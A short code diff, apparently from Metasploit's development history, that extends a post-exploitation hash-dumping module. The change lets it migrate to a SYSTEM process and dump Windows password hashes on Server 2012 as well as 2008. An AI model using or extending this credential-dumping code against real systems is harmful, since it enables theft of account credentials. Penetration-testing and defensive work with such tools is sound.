@@ -447,7 +447,7 @@ class Metasploit3 < Msf::Post
 					rescue::Exception => e
 						print_error("Failed to dump hashes as SYSTEM, trying to migrate to another process")
 
-						if sysinfo['OS'] =~ /Windows 2008/i
+						if sysinfo['OS'] =~ /Windows (2008|2012)/i
 							move_to_sys
 							file_local_write(pwdfile,inject_hashdump)
 						else
